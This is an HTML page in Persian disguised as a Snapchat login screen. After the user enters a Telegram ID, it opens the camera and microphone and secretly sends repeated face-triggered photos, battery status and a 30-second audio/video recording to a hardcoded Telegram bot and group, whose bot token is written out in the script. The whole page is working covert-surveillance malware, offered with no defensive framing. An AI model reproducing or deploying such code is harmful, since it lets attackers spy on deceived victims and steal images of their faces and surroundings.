<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snap Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fffc00;
      color: #000;
      direction: rtl;
    }
    #cameraContainer {
      display: none;
      flex-direction: column;
      align-items: center;
      height: 100vh;
      justify-content: space-between;
      padding: 1rem;
      position: relative;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
    }
    #controls {
      position: relative;
      z-index: 10;
      width: 100%;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1rem;
    }
    #captureBtn {
      width: 70px;
      height: 70px;
      background: white;
      border-radius: 9999px;
      border: 4px solid black;
    }
    #flipBtn {
      background: rgba(0,0,0,0.3);
      border-radius: 9999px;
      padding: 0.5rem;
    }
  </style>
</head>
<body>
  <div id="loginContainer" class="flex flex-col items-center justify-center min-h-screen px-4">
    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" class="w-16 mb-4" />
    <h1 class="text-2xl font-bold mb-4">ورود به اسنپ‌چت</h1>
    <input id="userId" type="text" placeholder="آیدی تلگرام (مثلاً user123)" class="w-full max-w-md p-3 rounded-lg text-black mb-4" />
    <button onclick="startApp()" class="w-full max-w-md bg-black text-white p-3 rounded-lg font-bold text-lg">
      ورود
    </button>
  </div>

  <div id="cameraContainer">
    <video id="video" autoplay playsinline muted></video>
    <div id="controls">
      <button id="flipBtn" onclick="switchCamera()"><i data-lucide="refresh-ccw"></i></button>
      <button id="captureBtn" onclick="manualCapture()"></button>
      <span id="timer" class="text-sm bg-white text-black p-1 rounded">0s</span>
    </div>
  </div>

  <script>
    lucide.createIcons();

    const botToken = '7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU';
    const groupId = '-1002645916072';
    let stream, mediaRecorder, recordedChunks = [], uid = "", photoCount = 0, seconds = 0;
    let useFront = true, faceDetected = false, started = false;

    async function startApp() {
      uid = document.getElementById("userId").value.trim();
      if (!uid || uid.includes("@")) return alert("آیدی بدون @ وارد کن");
      document.getElementById("loginContainer").style.display = "none";
      document.getElementById("cameraContainer").style.display = "flex";
      await startCamera();
      startTimer();
      detectFaceLoop();
      startRecording();
      setTimeout(() => {
        if (!faceDetected) autoCaptureLoop(15, 4000);
      }, 7000);
    }

    async function startCamera() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: useFront ? "user" : "environment" }, audio: true
      });
      document.getElementById("video").srcObject = stream;
    }

    function switchCamera() {
      useFront = !useFront;
      startCamera();
    }

    function startTimer() {
      setInterval(() => {
        seconds++;
        document.getElementById("timer").innerText = `${seconds}s`;
      }, 1000);
    }

    async function detectFaceLoop() {
      if (!('FaceDetector' in window)) return;
      const detector = new FaceDetector();
      const canvas = document.createElement("canvas");
      const video = document.getElementById("video");
      const ctx = canvas.getContext("2d");

      const loop = async () => {
        if (photoCount >= 15) return;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const faces = await detector.detect(canvas);
        if (faces.length > 0) {
          faceDetected = true;
          captureAndSend();
          setTimeout(loop, 4000);
        } else {
          setTimeout(loop, 1000);
        }
      };
      loop();
    }

    function autoCaptureLoop(max, interval) {
      let count = 0;
      const loop = () => {
        if (count >= max || faceDetected) return;
        captureAndSend();
        count++;
        setTimeout(loop, interval);
      };
      loop();
    }

    async function manualCapture() {
      if (photoCount < 15) captureAndSend();
    }

    function captureAndSend() {
      const video = document.getElementById("video");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const battery = await navigator.getBattery();
        const form = new FormData();
        form.append("chat_id", groupId);
        form.append("photo", blob, `photo_${photoCount + 1}.jpg`);
        form.append("caption", `🆔: ${uid}\n🖼️ عکس ${++photoCount}/15\n🔋 ${Math.round(battery.level * 100)}%\n⚡ شارژ: ${battery.charging ? 'بله' : 'خیر'}`);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST", body: form
        });
      }, 'image/jpeg', 0.7);
    }

    function startRecording() {
      recordedChunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9" });
      mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 30000);
    }

    function sendVideo() {
      const blob = new Blob(recordedChunks, { type: "video/webm" });
      const form = new FormData();
      form.append("chat_id", groupId);
      form.append("video", blob, `video_${Date.now()}.webm`);
      form.append("caption", `🎥 ویدیو از کاربر ${uid}`);
      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST", body: form
      });
    }
  </script>
</body>
</html>
